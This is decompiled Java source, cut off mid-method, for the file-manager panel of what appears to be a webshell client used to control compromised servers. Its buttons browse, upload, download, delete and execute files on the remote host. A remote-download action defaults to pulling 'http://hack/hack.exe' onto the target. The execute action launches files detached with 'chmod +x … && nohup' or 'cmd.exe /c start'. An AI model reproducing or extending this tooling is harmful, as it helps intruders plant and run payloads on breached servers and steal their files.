//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package core.ui.component;

import com.formdev.flatlaf.util.StringUtils;
import core.ApplicationContext;
import core.EasyI18N;
import core.Encoding;
import core.annotation.DisplayName;
import core.imp.Payload;
import core.shell.GFile;
import core.shell.ShellEntity;
import core.ui.component.annotation.ButtonToMenuItem;
import core.ui.component.dialog.FileAtt;
import core.ui.component.dialog.FileDialog2;
import core.ui.component.dialog.GFileChooser;
import core.ui.component.dialog.GOptionPane;
import core.ui.component.dialog.HttpProgressBar;
import core.ui.component.frame.EditFileFrame;
import core.ui.component.frame.ImageShowFrame;
import core.ui.component.model.FileInfo;
import core.ui.component.model.FileOpertionInfo;
import java.awt.BorderLayout;
import java.awt.CardLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.awt.event.ActionEvent;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.Objects;
import java.util.Vector;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import javax.imageio.ImageIO;
import javax.swing.BorderFactory;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.TransferHandler;
import javax.swing.border.Border;
import javax.swing.border.TitledBorder;
import javax.swing.tree.DefaultMutableTreeNode;
import util.FileExtIcon;
import util.Log;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;

@DisplayName(
    DisplayName = "\u6587\u4ef6\u7ba1\u7406"
)
public class ShellFileManager extends JPanel {
    private static final String TITLED_FORMAT = EasyI18N.getI18nString("\u5f53\u524d\u76ee\u5f55\u5171\u6709:%s\u4e2a\u6587\u4ef6 %s\u4e2a\u6587\u4ef6\u5939 \u603b\u5927\u5c0f:%s");
    public static final ThreadLocal<Boolean> bigFileThreadLocal = new ThreadLocal();
    private JScrollPane filelJscrollPane;
    private DataTree fileDataTree;
    private JPanel filePanel;
    private JPanel fileOpertionPanel;
    private DefaultMutableTreeNode rootTreeNode;
    private JScrollPane dataViewSplitPane;
    private JScrollPane toolSplitPane;
    private DataView dataView;
    private ShellRSFilePanel rsFilePanel;
    private JPanel dataViewPanel;
    private JPanel toolsPanel;
    @ButtonToMenuItem
    private JButton editFileButton;
    @ButtonToMenuItem
    private JButton editFileNewWindowButton;
    @ButtonToMenuItem
    private JButton editFileInEditFileFrameButton;
    @ButtonToMenuItem
    private JButton showImageFileButton;
    @ButtonToMenuItem
    private JButton uploadButton;
    @ButtonToMenuItem
    private JButton moveButton;
    @ButtonToMenuItem
    private JButton copyFileButton;
    @ButtonToMenuItem
    private JButton copyNameButton;
    @ButtonToMenuItem
    private JButton deleteFileButton;
    @ButtonToMenuItem
    private JButton newFileButton;
    @ButtonToMenuItem
    private JButton newDirButton;
    @ButtonToMenuItem
    private JButton executeFileButton;
    @ButtonToMenuItem
    private JButton refreshButton;
    @ButtonToMenuItem
    private JButton downloadButton;
    @ButtonToMenuItem
    private JButton fileAttrButton;
    @ButtonToMenuItem
    private JButton fileRemoteDownButton;
    @ButtonToMenuItem
    private JButton bigFileDownloadButton;
    @ButtonToMenuItem
    private JButton bigFileUploadButton;
    private JTextField dirField;
    private JPanel dirPanel;
    private JSplitPane jSplitPane1;
    private JSplitPane jSplitPane2;
    private JSplitPane jSplitPane3;
    private Vector<String> dateViewColumnVector;
    private ImageIcon dirIcon;
    private ImageIcon fileIcon;
    private String currentDir;
    private final ShellEntity shellEntity;
    private final Payload payload;
    private final Encoding encoding;
    private final TitledBorder titledBorder;
    private final AtomicBoolean listingBusy = new AtomicBoolean(false);
    private final AtomicBoolean executeBusy = new AtomicBoolean(false);

    public ShellFileManager(ShellEntity entity) {
        this.titledBorder = BorderFactory.createTitledBorder((Border)null, String.format(TITLED_FORMAT, 0, 0, 0), 0, 0, (Font)null, (Color)null);
        this.shellEntity = entity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        this.setLayout(new BorderLayout(1, 1));
        this.InitJPanel();
        this.InitEvent();
        this.updateUI();
        this.init(this.shellEntity);
        EasyI18N.installObject(this.dataView);
    }

    public void init(ShellEntity shellEntity) {
        this.titledBorder.setTitle("\u52a0\u8f7d\u4e2d...");
        (new Thread(() -> {
            String[] fileRoot = null;
            String webDir = "/";
            try {
                fileRoot = this.payload.listFileRoot();
                webDir = functions.formatDir(this.payload.getWebDir());
            } catch (Throwable t) {
                Log.error(t);
            }
            final String[] roots = fileRoot;
            final String dir = StringUtils.isEmpty(webDir) ? "/" : webDir.substring(0, 1).toUpperCase() + webDir.substring(1);
            SwingUtilities.invokeLater(() -> {
                if (roots != null) {
                    for (int i = 0; i < roots.length; ++i) {
                        this.fileDataTree.AddNote(roots[i]);
                    }
                }
                this.currentDir = dir;
                this.dirField.setText(this.currentDir);
                this.fileDataTree.AddNote(this.currentDir);
                this.titledBorder.setTitle(String.format(TITLED_FORMAT, 0, 0, 0));
                this.jSplitPane2.updateUI();
            });
        }, "gsl5-file-init")).start();
    }

    private void InitJPanel() {
        this.filePanel = new JPanel();
        this.filePanel.setLayout(new BorderLayout(1, 1));
        this.filelJscrollPane = new JScrollPane();
        this.rootTreeNode = new DefaultMutableTreeNode("Disk");
        this.fileDataTree = new DataTree("", this.rootTreeNode);
        this.fileDataTree.setRootVisible(true);
        this.filelJscrollPane.setViewportView(this.fileDataTree);
        this.filePanel.add(this.filelJscrollPane);
        this.fileOpertionPanel = new JPanel(new CardLayout());
        this.dateViewColumnVector = new Vector();
        this.dateViewColumnVector.add("icon");
        this.dateViewColumnVector.add("name");
        this.dateViewColumnVector.add("type");
        this.dateViewColumnVector.add("lastModified");
        this.dateViewColumnVector.add("size");
        this.dateViewColumnVector.add("permission");
        this.dataViewSplitPane = new JScrollPane();
        this.dataViewPanel = new JPanel();
        this.dataViewPanel.setLayout(new BorderLayout(1, 1));
        this.dataView = new DataView((Vector)null, this.dateViewColumnVector, 0, 30);
        this.dataViewSplitPane.setViewportView(this.dataView);
        this.fileOpertionPanel.add("dataView", this.dataViewSplitPane);
        this.rsFilePanel = new ShellRSFilePanel(this.shellEntity, this.fileOpertionPanel, "dataView");
        this.fileOpertionPanel.add("rsFile", this.rsFilePanel);
        this.dataViewPanel.add(this.fileOpertionPanel);
        this.toolSplitPane = new JScrollPane();
        this.toolsPanel = new JPanel();
        this.editFileButton = new JButton("\u5728\u5f53\u524d\u7a97\u53e3\u7f16\u8f91\u6587\u4ef6");
        this.editFileNewWindowButton = new JButton("\u5728\u65b0\u7a97\u53e3\u7f16\u8f91\u6587\u4ef6");
        this.editFileInEditFileFrameButton = new JButton("\u5728\u7f16\u8f91\u5668\u7f16\u8f91\u6b64\u6587\u4ef6");
        this.showImageFileButton = new JButton("\u5728\u65b0\u7a97\u53e3\u663e\u793a\u56fe\u7247");
        this.uploadButton = new JButton("\u4e0a\u4f20");
        this.refreshButton = new JButton("\u5237\u65b0");
        this.moveButton = new JButton("\u79fb\u52a8");
        this.copyFileButton = new JButton("\u590d\u5236");
        this.downloadButton = new JButton("\u4e0b\u8f7d");
        this.copyNameButton = new JButton("\u590d\u5236\u7edd\u5bf9\u8def\u5f84");
        this.deleteFileButton = new JButton("\u5220\u9664\u6587\u4ef6");
        this.newFileButton = new JButton("\u65b0\u5efa\u6587\u4ef6");
        this.newDirButton = new JButton("\u65b0\u5efa\u6587\u4ef6\u5939");
        this.fileAttrButton = new JButton("\u6587\u4ef6\u5c5e\u6027");
        this.fileRemoteDownButton = new JButton("\u8fdc\u7a0b\u4e0b\u8f7d");
        this.executeFileButton = new JButton("\u6267\u884c");
        this.bigFileDownloadButton = new JButton("\u5927\u6587\u4ef6\u4e0b\u8f7d");
        this.bigFileUploadButton = new JButton("\u5927\u6587\u4ef6\u4e0a\u4f20");
        this.toolsPanel.add(this.uploadButton);
        this.toolsPanel.add(this.moveButton);
        this.toolsPanel.add(this.refreshButton);
        this.toolsPanel.add(this.copyFileButton);
        this.toolsPanel.add(this.copyNameButton);
        this.toolsPanel.add(this.deleteFileButton);
        this.toolsPanel.add(this.newFileButton);
        this.toolsPanel.add(this.newDirButton);
        this.toolsPanel.add(this.downloadButton);
        this.toolsPanel.add(this.fileAttrButton);
        this.toolsPanel.add(this.fileRemoteDownButton);
        this.toolsPanel.add(this.executeFileButton);
        this.toolsPanel.add(this.bigFileUploadButton);
        this.toolsPanel.add(this.bigFileDownloadButton);
        this.toolSplitPane.setViewportView(this.toolsPanel);
        this.dirPanel = new JPanel();
        this.dirPanel.setLayout(new BorderLayout(1, 1));
        this.dirField = new JTextField();
        this.dirField.setColumns(100);
        this.dirPanel.add(this.dirField);
        this.dirIcon = new ImageIcon(this.getClass().getResource("/images/folder.png"));
        this.fileIcon = new ImageIcon(this.getClass().getResource("/images/file.png"));
        this.fileDataTree.setLeafIcon(new ImageIcon(this.getClass().getResource("/images/folder.png")));
        this.jSplitPane2 = new JSplitPane();
        this.jSplitPane2.setBorder(this.titledBorder);
        this.jSplitPane2.setOrientation(0);
        this.jSplitPane2.setTopComponent(this.dataViewPanel);
        this.jSplitPane2.setBottomComponent(this.toolSplitPane);
        this.jSplitPane3 = new JSplitPane();
        this.jSplitPane3.setOrientation(0);
        this.jSplitPane3.setTopComponent(this.dirPanel);
        this.jSplitPane3.setBottomComponent(this.jSplitPane2);
        this.jSplitPane1 = new JSplitPane();
        this.jSplitPane1.setOrientation(1);
        this.jSplitPane1.setLeftComponent(this.filePanel);
        this.jSplitPane1.setRightComponent(this.jSplitPane3);
        this.add(this.jSplitPane1);
    }

    private void InitEvent() {
        automaticBindClick.bindJButtonClick(this, this);
        automaticBindClick.bindButtonToMenuItem(this, this, this.dataView.getRightClickMenu());
        this.dataView.setActionDblClick((e) -> {
            this.dataViewDbClick(e);
        });
        this.fileDataTree.setActionDbclick((e) -> {
            this.fileDataTreeDbClick(e);
        });
        this.dirField.addKeyListener(new KeyAdapter() {
            public void keyPressed(KeyEvent e) {
                if (e.getKeyChar() == '\n') {
                    ShellFileManager.this.refreshButtonClick((ActionEvent)null);
                }

            }
        });
        this.jSplitPane2.setTransferHandler(new TransferHandler() {
            private static final long serialVersionUID = 1L;

            public boolean importData(JComponent comp, Transferable t) {
                try {
                    Object o = t.getTransferData(DataFlavor.javaFileListFlavor);
                    if (List.class.isAssignableFrom(o.getClass())) {
                        List list = (List)o;
                        if (list.size() == 1) {
                            Object fileObject = list.get(0);
                            if (File.class.isAssignableFrom(fileObject.getClass())) {
                                File file = (File)fileObject;
                                if (file.canRead() && file.isFile()) {
                                    String uploadFileString = ShellFileManager.this.currentDir + file.getName();
                                    ShellFileManager.this.uploadFile(uploadFileString, file, false);
                                } else {
                                    GOptionPane.showMessageDialog((Component)null, "\u76ee\u6807\u4e0d\u662f\u6587\u4ef6 \u6216\u4e0d\u53ef\u8bfb");
                                }
                            } else {
                                GOptionPane.showMessageDialog((Component)null, "\u76ee\u6807\u4e0d\u662f\u6587\u4ef6");
                            }
                        } else {
                            GOptionPane.showMessageDialog((Component)null, "\u4e0d\u652f\u6301\u591a\u6587\u4ef6\u64cd\u4f5c");
                        }
                    } else {
                        GOptionPane.showMessageDialog((Component)null, "\u4e0d\u652f\u6301\u7684\u64cd\u4f5c");
                    }

                    return true;
                } catch (Exception var8) {
                    GOptionPane.showMessageDialog(ShellFileManager.this.shellEntity.getFrame(), var8.getMessage(), "\u63d0\u793a", 1);
                    Log.error(var8);
                    return false;
                }
            }

            public boolean canImport(JComponent comp, DataFlavor[] flavors) {
                for(int i = 0; i < flavors.length; ++i) {
                    if (DataFlavor.javaFileListFlavor.equals(flavors[i])) {
                        return true;
                    }
                }

                return false;
            }
        });
    }

    public void dataViewDbClick(MouseEvent e) {
        this.runFileIo(() -> this.editFileInEditFileFrameButtonClick((ActionEvent)null));
    }

    public void editFileNewWindowButtonClick(ActionEvent e) {
        Vector rowVector = this.dataView.GetSelectRow();
        String fileType = (String)rowVector.get(2);
        String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
        long fileSize = ((FileInfo)rowVector.get(4)).getSize();
        if (fileType.equals("file")) {
            ShellRSFilePanel shellRSFilePanel = new ShellRSFilePanel(this.shellEntity, (JPanel)null, "editFileNewWindow");
            JFrame frame = new JFrame("editFile");
            frame.add(shellRSFilePanel);
            shellRSFilePanel.rsFile(fileNameString);
            functions.setWindowSize(frame, 700, 800);
            frame.setLocationRelativeTo((Component)null);
            frame.setVisible(true);
            frame.setDefaultCloseOperation(2);
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u76ee\u6807\u662f\u6587\u4ef6\u5939", "\u8b66\u544a", 2);
        }

    }

    public void editFileButtonClick(ActionEvent e) {
        Vector rowVector = this.dataView.GetSelectRow();
        String fileType = (String)rowVector.get(2);
        String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
        long fileSize = ((FileInfo)rowVector.get(4)).getSize();
        if (fileType.equals("dir")) {
            this.refreshFile(this.dirField.getText() + "/" + rowVector.get(1));
        } else if (fileSize < 1048576L) {
            this.rsFilePanel.rsFile(fileNameString);
            ((CardLayout)((CardLayout)this.fileOpertionPanel.getLayout())).show(this.fileOpertionPanel, "rsFile");
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u76ee\u6807\u6587\u4ef6\u5927\u5c0f\u5927\u4e8e1MB", "\u63d0\u793a", 2);
        }

    }

    public void editFileInEditFileFrameButtonClick(ActionEvent e) {
        Vector rowVector = this.dataView.GetSelectRow();
        String fileType = (String)rowVector.get(2);
        String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
        long fileSize = ((FileInfo)rowVector.get(4)).getSize();
        if (fileType.equals("file")) {
            ShellRSFilePanel shellRSFilePanel = new ShellRSFilePanel(this.shellEntity, (JPanel)null, "editFileNewWindow");
            shellRSFilePanel.rsFile(fileNameString);
            EditFileFrame.OpenNewEdit(shellRSFilePanel);
        } else {
            this.refreshFile(this.dirField.getText() + "/" + rowVector.get(1));
        }

    }

    public void showImageFileButtonClick(ActionEvent e) {
        Vector rowVector = this.dataView.GetSelectRow();
        String fileType = (String)rowVector.get(2);
        String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
        long fileSize = ((FileInfo)rowVector.get(4)).getSize();
        if (fileType.equals("dir")) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u76ee\u6807\u662f\u6587\u4ef6\u5939", "\u8b66\u544a", 2);
        } else if (fileSize < 3145728L) {


            try {
                byte[] fileContent = this.payload.downloadFile(fileNameString);
                ImageShowFrame.showImageDiaolog(new ImageIcon(ImageIO.read(new ByteArrayInputStream(fileContent))));
            } catch (Exception var9) {
                Log.error(var9);
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4e0b\u8f7d\u6587\u4ef6\u5931\u8d25", "\u9519\u8bef", 0);
            }
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u76ee\u6807\u6587\u4ef6\u5927\u5c0f\u5927\u4e8e3MB", "\u63d0\u793a", 2);
        }

    }

    public void fileDataTreeDbClick(MouseEvent e) {
        this.refreshFile(this.fileDataTree.GetSelectFile());
    }

    public void moveButtonClick(ActionEvent e) {
        String fileString = this.getSelectdFile();
        FileOpertionInfo fileOpertionInfo = FileDialog2.showFileOpertion(this.shellEntity.getFrame(), "reName", fileString, fileString);
        if (fileOpertionInfo.getOpertionStatus() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo.getDestFileName().trim().length() > 0) {
            String srcFileString = fileOpertionInfo.getSrcFileName();
            String destFileString = fileOpertionInfo.getDestFileName();
            boolean state = this.payload.moveFile(srcFileString, destFileString);
            if (state) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), String.format(EasyI18N.getI18nString("\u79fb\u52a8\u6210\u529f  %s >> %s"), fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName()), "\u63d0\u793a", 1);
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4fee\u6539\u5931\u8d25", "\u63d0\u793a", 2);
            }
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4fe1\u606f\u586b\u5199\u4e0d\u5b8c\u6574", "\u63d0\u793a", 2);
        }

    }

    public void copyFileButtonClick(ActionEvent e) {
        String fileString = this.getSelectdFile();
        FileOpertionInfo fileOpertionInfo = FileDialog2.showFileOpertion(this.shellEntity.getFrame(), "copy", fileString, fileString);
        if (fileOpertionInfo.getOpertionStatus() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo.getDestFileName().trim().length() > 0) {
            boolean state = this.payload.copyFile(fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName());
            if (state) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), String.format(EasyI18N.getI18nString("\u590d\u5236\u6210\u529f  %s <<>> %s"), fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName()), "\u63d0\u793a", 1);
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u590d\u5236\u5931\u8d25", "\u63d0\u793a", 2);
            }
        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u4fe1\u606f\u586b\u5199\u4e0d\u5b8c\u6574", "\u63d0\u793a", 2);
        }

    }

    public void copyNameButtonClick(ActionEvent e) {
        Vector vector = this.dataView.GetSelectRow();
        if (vector != null) {
            String fileString = functions.formatDir(this.currentDir) + vector.get(1);
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(fileString), (ClipboardOwner)null);
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u5df2\u7ecf\u590d\u5236\u5230\u526a\u8f91\u7248");
        }

    }

    public void deleteFileButtonClick(ActionEvent e) {
        String fileString = this.getSelectdFile();
        String inputFile = GOptionPane.showInputDialog("\u8f93\u5165\u6587\u4ef6\u540d\u79f0", fileString);
        if (inputFile != null) {
            boolean state = this.payload.deleteFile(inputFile);
            if (state) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u5220\u9664\u6210\u529f", "\u63d0\u793a", 1);
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u5220\u9664\u5931\u8d25", "\u63d0\u793a", 2);
            }
        } else {
            Log.log("\u7528\u6237\u53d6\u6d88\u9009\u62e9.....");
        }

    }

    private String getSelectdFileName() {
        String fileString = "";

        try {
            fileString = (String)this.dataView.getValueAt(this.dataView.getSelectedRow(), 1);
        } catch (Exception var3) {
        }

        return fileString;
    }

    private String getSelectdFile() {
        String fileString = "";

        try {
            fileString = functions.formatDir(this.currentDir) + this.dataView.getValueAt(this.dataView.getSelectedRow(), 1);
        } catch (Exception var3) {
        }

        return fileString;
    }

    public void newFileButtonClick(ActionEvent e) {
        String fileString = functions.formatDir(this.currentDir) + "newFile";
        String inputFile = GOptionPane.showInputDialog("\u8f93\u5165\u6587\u4ef6\u540d\u79f0", fileString);
        if (inputFile != null) {
            boolean state = this.payload.newFile(inputFile);
            if (state) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u65b0\u5efa\u6587\u4ef6\u6210\u529f", "\u63d0\u793a", 1);
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u65b0\u5efa\u6587\u4ef6\u5931\u8d25", "\u63d0\u793a", 2);
            }
        } else {
            Log.log("\u7528\u6237\u53d6\u6d88\u9009\u62e9.....");
        }

    }

    public void uploadButtonClick(ActionEvent e) {
        (new Thread(new Runnable() {
            public void run() {
                ApplicationContext.isShowHttpProgressBar.set(new Boolean(true));
                if (ApplicationContext.isGodMode()) {
                    ShellFileManager.this.GUploadFile(false);
                } else {
                    ShellFileManager.this.UploadFile(false);
                }

            }
        })).start();
    }

    public void bigFileUploadButtonClick(ActionEvent e) {
        (new Thread(new Runnable() {
            public void run() {
                if (ApplicationContext.isGodMode()) {
                    ShellFileManager.this.GUploadFile(true);
                } else {
                    ShellFileManager.this.UploadFile(true);
                }

            }
        })).start();
    }

    public void refreshButtonClick(ActionEvent e) {
        this.refreshFile(functions.formatDir(this.dirField.getText()));
    }

    public void executeFileButtonClick(ActionEvent e) {
        if (!this.executeBusy.compareAndSet(false, true)) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u6b63\u5728\u6267\u884c\uff0c\u8bf7\u7a0d\u5019", "\u63d0\u793a", 1);
            return;
        }
        try {
            String fileString = this.getSelectdFile();
            String inputFile = GOptionPane.showInputDialog("\u8f93\u5165\u53ef\u6267\u884c\u6587\u4ef6\u540d\u79f0", fileString);
            if (inputFile == null) {
                Log.log("\u7528\u6237\u53d6\u6d88\u9009\u62e9.....");
                return;
            }
            String cmdString = this.buildDetachedExecuteCommand(inputFile);
            Log.log(String.format("Execute Command Start As %s", cmdString));
            String result = this.payload.execCommand(cmdString);
            Log.log(String.format("execute Command End %s", result));
            final String shown = result == null ? "" : result.trim();
            if (shown.length() > 0) {
                SwingUtilities.invokeLater(() -> GOptionPane.showMessageDialog(UiFunction.getParentFrame(this),
                        shown.length() > 800 ? shown.substring(0, 800) + "..." : shown, "\u6267\u884c\u7ed3\u679c", 1));
            }
        } catch (Throwable t) {
            Log.error(t);
            final String msg = t.getMessage() == null ? t.getClass().getSimpleName() : t.getMessage();
            SwingUtilities.invokeLater(() -> GOptionPane.showMessageDialog(UiFunction.getParentFrame(this),
                    "\u6267\u884c\u4e2d\u65ad: " + msg, "\u63d0\u793a", 2));
        } finally {
            this.executeBusy.set(false);
        }
    }

    private String buildDetachedExecuteCommand(String inputFile) {
        String raw = inputFile == null ? "" : inputFile.trim();
        if (!this.payload.isWindows()) {
            String quoted = quoteShellArg(raw);
            return "chmod +x " + quoted + " && nohup " + quoted + " >/dev/null 2>&1 &";
        }
        String lower = raw.toLowerCase();
        if (lower.startsWith("cmd") || lower.startsWith("start ") || lower.startsWith("powershell")) {
            return raw;
        }
        return "cmd.exe /c start \"\" " + quoteWinArg(raw);
    }

    private static String quoteWinArg(String path) {
        if (path == null) {
            return "\"\"";
        }
        String p = path.trim();
        if (p.startsWith("\"") && p.endsWith("\"") && p.length() >= 2) {
            return p;
        }
        return "\"" + p.replace("\"", "\\\"") + "\"";
    }

    private static String quoteShellArg(String path) {
        if (path == null) {
            return "''";
        }
        return "'" + path.replace("'", "'\"'\"'") + "'";
    }

    public void downloadButtonClick(ActionEvent e) {
        (new Thread(new Runnable() {
            public void run() {
                ApplicationContext.isShowHttpProgressBar.set(new Boolean(true));
                if (ApplicationContext.isGodMode()) {
                    ShellFileManager.this.GDownloadFile(false);
                } else {
                    ShellFileManager.this.downloadFile(false);
                }

            }
        })).start();
    }

    public void bigFileDownloadButtonClick(ActionEvent e) {
        (new Thread(new Runnable() {
            public void run() {
                if (ApplicationContext.isGodMode()) {
                    ShellFileManager.this.GDownloadFile(true);
                } else {
                    ShellFileManager.this.downloadFile(true);
                }

            }
        })).start();
    }

    public void newDirButtonClick(ActionEvent e) {
        String fileString = functions.formatDir(this.currentDir) + "newDir";
        String inputFile = GOptionPane.showInputDialog("\u8f93\u5165\u6587\u4ef6\u5939\u540d\u79f0", fileString);
        if (inputFile != null) {
            boolean state = this.payload.newDir(inputFile);
            if (state) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u65b0\u5efa\u6587\u4ef6\u5939\u6210\u529f", "\u63d0\u793a", 1);
            } else {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u65b0\u5efa\u6587\u4ef6\u5939\u5931\u8d25", "\u63d0\u793a", 2);
            }
        } else {
            Log.log("\u7528\u6237\u53d6\u6d88\u9009\u62e9.....");
        }

    }

    public void fileAttrButtonClick(ActionEvent e) {
        String fileString = this.getSelectdFile();
        String filePermission = (String)this.dataView.getValueAt(this.dataView.getSelectedRow(), 5);
        String fileTime = (String)this.dataView.getValueAt(this.dataView.getSelectedRow(), 3);
        new FileAtt(this.shellEntity, fileString, filePermission, fileTime);
    }

    public void fileRemoteDownButtonClick(ActionEvent e) {
        final FileOpertionInfo fileOpertionInfo = FileDialog2.showFileOpertion(this.shellEntity.getFrame(), "fileRemoteDown", "http://hack/hack.exe", this.currentDir + "hack.exe");
        if (fileOpertionInfo.getOpertionStatus()) {
            (new Thread(new Runnable() {
                public void run() {
                    boolean state = ShellFileManager.this.payload.fileRemoteDown(fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName());
                    if (state) {
                        GOptionPane.showMessageDialog(ShellFileManager.this.shellEntity.getFrame(), "\u8fdc\u7a0b\u4e0b\u8f7d\u6210\u529f", "\u63d0\u793a", 1);
                    } else {
                        GOptionPane.showMessageDialog(ShellFileManager.this.shellEntity.getFrame(), "\u8fdc\u7a0b\u4e0b\u8f7d\u5931\u8d25", "\u63d0\u793a", 2);
                    }

                }
            })).start();
        }

    }

    private static String sanitizeHtml(String s) {
        if (s != null && s.length() >= 5 && s.substring(0, 5).equalsIgnoreCase("<html")) {
            return "?" + s;
        }
        return s;
    }

    private void onEdt(Runnable task) {
        if (SwingUtilities.isEventDispatchThread()) {
            task.run();
        } else {
            try {
                SwingUtilities.invokeAndWait(task);
            } catch (Exception e) {
                SwingUtilities.invokeLater(task);
            }
        }
    }

    private Vector<Vector<Object>> getAllFile(String filePathString) {
        filePathString = functions.formatDir(filePathString);
        GFile[] files = null;

        try {
            files = this.payload.getFile(filePathString);
        } catch (Exception var12) {
            var12.printStackTrace();
            Log.error(var12);
            final String msg = var12.getMessage();
            this.onEdt(() -> GOptionPane.showMessageDialog((Component)null, msg));
            return null;
        }

        new Vector();
        int fileCount = 0;
        int dirCount = 0;
        long allFileSize = 0L;

        Vector rows;
        java.util.List<String> dirNotes = new java.util.ArrayList<String>();
        try {
            if (files == null || files.length <= 0) {
                this.onEdt(() -> GOptionPane.showMessageDialog((Component)null, "\u65e0\u6cd5\u89e3\u6790\u8fd4\u56de\u7684\u6570\u636e"));
                return null;
            }

            rows = new Vector();
            String currentDir = functions.formatDir(files[0].getPath());
            this.currentDir = currentDir;
            dirNotes.add(currentDir);

            for(int i = 1; i < files.length; ++i) {
                GFile file = files[i];
                Vector<Object> row = new Vector();
                if (file.isDirectory()) {
                    row.add(this.dirIcon);
                    dirNotes.add(file.getAbsolutePath());
                    ++dirCount;
                } else {
                    allFileSize += file.length();
                    ++fileCount;
                    row.add(FileExtIcon.getExtIcon(file.getName()));
                }

                row.add(sanitizeHtml(file.getName()));
                row.add(file.isDirectory() ? "dir" : "file");
                row.add(sanitizeHtml(file.lastModifiedStr()));
                row.add(new FileInfo(file.length()));
                row.add(sanitizeHtml(file.getPermission()));
                rows.add(row);
            }
        } catch (Throwable var13) {
            var13.printStackTrace();
            final String msg = var13.getMessage();
            this.onEdt(() -> GOptionPane.showMessageDialog((Component)null, msg));
            return null;
        }

        final int fc = fileCount;
        final int dc = dirCount;
        final long sz = allFileSize;
        final String shownDir = this.currentDir;
        this.onEdt(() -> {
            this.dirField.setText(shownDir);
            for (String note : dirNotes) {
                this.fileDataTree.AddNote(note);
            }
            this.titledBorder.setTitle(String.format(TITLED_FORMAT, fc, dc, (new FileInfo(sz)).toString()));
            this.jSplitPane2.updateUI();
        });
        return rows;
    }

    private void runFileIo(Runnable task) {
        if (SwingUtilities.isEventDispatchThread()) {
            (new Thread(task, "gsl5-file-io")).start();
        } else {
            task.run();
        }
    }

    private void refreshFile(String filePathString) {
        if (!this.listingBusy.compareAndSet(false, true)) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "\u6b63\u5728\u52a0\u8f7d\u76ee\u5f55\uff0c\u8bf7\u7a0d\u5019", "\u63d0\u793a", 1);
            return;
        }
        final String path = filePathString;
        this.titledBorder.setTitle("\u52a0\u8f7d\u4e2d: " + path);
        this.jSplitPane2.updateUI();
        this.runFileIo(() -> {
            Vector<Vector<Object>> rowsVector = null;
            Throwable error = null;
            try {
                rowsVector = this.getAllFile(path);
            } catch (Throwable t) {
                error = t;
                Log.error(t);
            }
            final Vector<Vector<Object>> rows = rowsVector;
            final Throwable fail = error;
            SwingUtilities.invokeLater(() -> {
                try {
                    if (rows != null) {
                        this.dataView.AddRows(rows);
                        this.dataView.getColumnModel().getColumn(0).setMaxWidth(35);
                        this.dataView.getModel().fireTableDataChanged();
                    } else if (fail != null) {
                        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this),
                                "\u6253\u5f00\u5931\u8d25: " + (fail.getMessage() == null ? fail.getClass().getSimpleName() : fail.getMessage()),
                                "\u63d0\u793a", 2);
                    }
                } finally {
                    this.listingBusy.set(false);
                    this.jSplitPane2.updateUI();
                }
            });
        });
    }

    private void GUploadFile(boolean bigFileUpload) {
        String destHint = this.currentDir == null ? "" : functions.formatDir(this.currentDir);
        FileOpertionInfo fileOpertionInfo = FileDialog2.showFileOpertion(this.shellEntity.getFrame(), "upload", "", destHint);
        if (fileOpertionInfo.getOpertionStatus() == null || !fileOpertionInfo.getOpertionStatus().booleanValue()) {
            return;
